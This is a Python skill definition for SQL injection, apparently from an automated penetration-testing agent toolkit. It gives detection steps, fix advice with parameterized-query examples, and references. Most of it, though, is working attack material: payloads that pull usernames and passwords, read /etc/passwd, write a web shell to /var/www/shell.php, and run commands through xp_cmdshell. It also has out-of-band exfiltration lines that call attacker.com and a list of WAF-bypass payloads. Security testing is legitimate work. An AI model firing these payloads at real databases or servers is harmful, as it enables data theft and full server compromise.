"""SQL Injection (SQLi) - All variants: error, UNION, blind boolean, blind time, second-order, WAF bypass."""

SKILL = {
    "id": "sql_injection",
    "name": "SQL Injection (SQLi)",
    "category": "injection",
    "severity": "critical",

    "detection": """
- Test ALL user inputs: URL params, form fields, headers (Cookie, Referer, User-Agent), JSON body, XML
- Send single quote (') and double quote (") to each parameter
- Look for database errors: MySQL, PostgreSQL, SQLite, MSSQL, Oracle
- Test blind SQLi with time delays:
  MySQL: ' OR SLEEP(5)--
  PostgreSQL: '; SELECT pg_sleep(5)--
  MSSQL: '; WAITFOR DELAY '0:0:5'--
  Oracle: ' AND 1=dbms_pipe.receive_message('x',5)--
  SQLite: ' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--
- Test boolean-based blind: ' OR '1'='1 vs ' OR '1'='2 and compare response length
- Check for UNION-based: ' ORDER BY 1-- incrementing until error to find column count
- Test second-order: inject in registration, trigger in profile/search
- Check error messages for stack traces exposing query structure
- Test numeric params without quotes: 1 OR 1=1
- Test ORDER BY injection: ?sort=1,SLEEP(5)
- Test IN clause: ?ids=1) OR 1=1--
- Test LIKE clause: ?search=%' OR '1'='1
- Use sql_injection_check tool with technique=all for automated testing
""",

    "exploitation": """
- Extract DB version:
  MySQL: ' UNION SELECT version()-- or @@version
  PostgreSQL: ' UNION SELECT version()--
  MSSQL: ' UNION SELECT @@version--
  Oracle: ' UNION SELECT banner FROM v$version WHERE ROWNUM=1--
  SQLite: ' UNION SELECT sqlite_version()--
- Enumerate databases:
  MySQL: ' UNION SELECT schema_name FROM information_schema.schemata--
  MSSQL: ' UNION SELECT name FROM master..sysdatabases--
- Enumerate tables:
  MySQL: ' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--
  PostgreSQL: ' UNION SELECT tablename FROM pg_tables WHERE schemaname='public'--
  MSSQL: ' UNION SELECT name FROM sysobjects WHERE xtype='U'--
  SQLite: ' UNION SELECT name FROM sqlite_master WHERE type='table'--
- Enumerate columns:
  All: ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
- Extract data: ' UNION SELECT username,password FROM users--
- Read files (MySQL): ' UNION SELECT LOAD_FILE('/etc/passwd')--
- Write files (MySQL): ' INTO OUTFILE '/var/www/shell.php'--
- OS command (MSSQL): '; EXEC xp_cmdshell 'whoami'--
- For blind SQLi: binary search with SUBSTRING() and ASCII() char by char
- Out-of-band:
  MySQL: LOAD_FILE(CONCAT('\\\\\\\\',injection,'.attacker.com\\\\'))
  MSSQL: EXEC master..xp_dirtree '\\\\injection.attacker.com\\x'
  Oracle: SELECT UTL_HTTP.REQUEST('http://attacker.com/'||injection) FROM dual
""",

    "remediation": """
- IMMEDIATE: Use parameterized queries / prepared statements in ALL database calls
  Python: cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
  Node.js: db.query("SELECT * FROM users WHERE id = $1", [userId])
  PHP: $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?"); $stmt->execute([$id]);
  Java: PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
- Use ORM (SQLAlchemy, Sequelize, Hibernate, Eloquent) instead of raw queries
- Apply input validation: whitelist allowed characters, reject special chars
- Set database user with LEAST PRIVILEGE: only SELECT on needed tables
- Enable WAF rules for SQLi patterns (but don't rely solely on WAF)
- Disable detailed error messages in production (no stack traces)
- Use stored procedures with parameterized inputs
- SSH fix: Review app code, find raw queries, replace with parameterized
- SSH fix: REVOKE ALL on DB user, GRANT only needed permissions
- SSH fix: Disable xp_cmdshell (MSSQL), LOAD_FILE/INTO OUTFILE (MySQL)
- Verify: re-run sql_injection_check with technique=all after fix
""",

    "tools": ["sql_injection_check", "web_spider", "waf_detect", "tech_fingerprint", "nmap_scan", "http_request"],

    "payloads": [
        "'", "\"", "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
        "1 OR 1=1", "1' OR '1'='1", "admin'--", "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
        "'; WAITFOR DELAY '0:0:5'--", "' OR SLEEP(5)--",
        "'; SELECT pg_sleep(5)--", "' AND 1=1--", "' AND 1=2--",
        "' UNION SELECT version()--", "' UNION SELECT @@version--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
        "' AND updatexml(1,concat(0x7e,version()),1)--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "') OR ('1'='1", "1) OR (1=1", "' OR ''='",
        "' /*!50000OR*/ '1'='1", "' %55NION %53ELECT 1--",
        "' uni/**/on sel/**/ect 1--", "0' DIV 1 DIV 1--",
    ],

    "references": [
        "OWASP A03:2021 - Injection",
        "CWE-89: SQL Injection",
        "CWE-564: SQL Injection: Hibernate",
        "CAPEC-66: SQL Injection",
    ],
}
